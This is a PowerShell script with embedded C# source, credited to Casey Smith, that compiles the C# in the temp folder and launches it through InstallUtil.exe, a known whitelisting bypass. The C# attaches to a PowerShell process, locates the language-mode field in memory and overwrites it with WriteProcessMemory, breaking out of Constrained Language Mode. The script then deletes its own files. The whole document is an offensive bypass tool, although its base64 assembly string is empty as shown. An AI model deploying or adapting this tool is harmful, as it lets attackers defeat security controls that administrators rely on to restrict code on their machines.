    [CmdletBinding()]
    Param(
        [Parameter( Mandatory = $False )]
        [int]
        $Process = $PID
    )
    
    Begin {
        if( $ExecutionContext.SessionState.LanguageMode.value__ -eq 0 ){
            $msgAlreadyRunningFullLanguage = "Session $($PID) is already in Full Language Mode."
            Write-Warning $msgAlreadyRunningFullLanguage
        }
        $fileName = [guid]::NewGuid().toString("n") 
        $unlockPrePath = "$env:Temp\$fileName"
        
        $unlockCSContent = @'
using System;
using System.Linq;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe unlock.cs

iex "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U /Process=$pid unlock.exe"
*/


[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState) {
		string pid = Context.Parameters["Process"];
		Console.WriteLine("Hello There From Uninstall");
		int procID;		 
        bool test = int.TryParse(pid, out procID);
        if (test == false) {
			System.Console.WriteLine("Woah Buddy... I need a Pid to continue");
            System.Console.WriteLine(@"Usage: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe\InstallUtil.exe /logfile= /LogToConsole=false /U /Process=1234 unlock.exe");
		}
		
		Unlocker.Exec(procID);
	}
}

public class Unlocker {
	public static void Main() {
		Console.WriteLine("Hey Nothing To See Here... Move Along.");
	}
	
	public static void Exec(int procID) {
		//Dynamically Load The Assembly Microsoft.Diagnostics.Runtime.dll
		// https://github.com/microsoft/clrmd
		byte[] f = Convert.FromBase64String("");
		Assembly clrmd = Assembly.Load(f);
		Console.WriteLine(clrmd.ToString());
		Console.WriteLine("Assembly Loaded.");

		Console.WriteLine("Hello There..., I am now a debugger...");
		Console.WriteLine("Unlocking Process {0}", procID);
		
		
		Type[] TypesInAssembly = null;
		TypesInAssembly = clrmd.GetTypes();
		int typeIndex = 0;
		for(int i = 0; i <TypesInAssembly.Length; i++) {
			if(TypesInAssembly[i].ToString() == "Microsoft.Diagnostics.Runtime.DataTarget") {
				//Console.WriteLine(TypesInAssembly[i].ToString());
				//Console.WriteLine("Index = {0}", i);
				typeIndex = i;
				break;
			}
		}
		Console.WriteLine(TypesInAssembly[typeIndex].ToString());
		object dt = TypesInAssembly[typeIndex].InvokeMember("AttachToProcess",
			System.Reflection.BindingFlags.InvokeMethod,
			System.Type.DefaultBinder,
			"",
			new object[] { procID, (uint)10000 }
			);
		
		object clrVersions = TypesInAssembly[typeIndex].GetProperty("ClrVersions").GetValue(dt);
		object clrInfo = ((Array)clrVersions).GetValue(0);
		
		MethodInfo mInfo = clrInfo.GetType().GetMethods().FirstOrDefault
				   (method => method.Name == "CreateRuntime"
				   && method.GetParameters().Count() == 0);
		object clrt = mInfo.Invoke(clrInfo, new object[] { } );
		Console.WriteLine(clrt.ToString());

		MethodInfo mInfo2 = clrt.GetType().GetMethods().FirstOrDefault
					(method => method.Name == "GetHeap"
					&& method.GetParameters().Count() == 0);
		object clrheap = mInfo2.Invoke(clrt, new object[] { });
		object segArray = (Array)clrheap.GetType().GetProperty("Segments").GetValue(clrheap);

		foreach (object seg in (Array)segArray) {
			for (ulong obj = (ulong)seg.GetType().GetProperty("FirstObject").GetValue(seg); obj != 0; obj = (ulong)seg.GetType().GetMethod("NextObject").Invoke(seg, new object[] { obj })) {
				object type = clrheap.GetType().GetMethod("GetObjectType").Invoke(clrheap, new object[] { obj });
				// If heap corruption, continue past this object.
				if (type == null) {
					continue;
				}
			   
				if ( type.ToString() == "System.Management.Automation.ExecutionContext") {
					Console.WriteLine("Target Acquired.");
					object langMode = type.GetType().GetMethod("GetFieldByName").Invoke(type, new object[] { "_languageMode" });
					Console.WriteLine(langMode.ToString());

					MethodInfo mInfo3 = langMode.GetType().GetMethods().FirstOrDefault
					(method => method.Name == "GetAddress"
					&& method.GetParameters().Count() == 1);
					
					object address =  mInfo3.Invoke(langMode, new object[] { obj });
					IntPtr addressPTR = new IntPtr(long.Parse(address.ToString()));
					IntPtr processHandle = OpenProcess(0x1F0FFF, false, procID);

					int bytesWritten = 0;
					byte[] buffer = { 0x00 };

					WriteProcessMemory((int)processHandle, addressPTR, buffer, buffer.Length, ref bytesWritten);
				}
			}
		}
		dt.GetType().GetMethod("Dispose").Invoke(dt, null);
		Console.WriteLine("Complete");
	}


	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool WriteProcessMemory(int hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);
}
'@
        
    }
    
    Process {
        Push-Location $env:Temp
        Set-Content -path $unlockPrePath -value $unlockCSContent -encoding UTF8
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe $unlockPrePath

        $unlockPostPath = $unlockPrePath + ".exe"
        Invoke-Expression "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U /Process=$Process $unlockPostPath"
        Pop-Location
    }
    
    End {
        Remove-Item -Path $unlockPostPath -Force
        Remove-Item -Path $unlockPrePath -Force
    }
}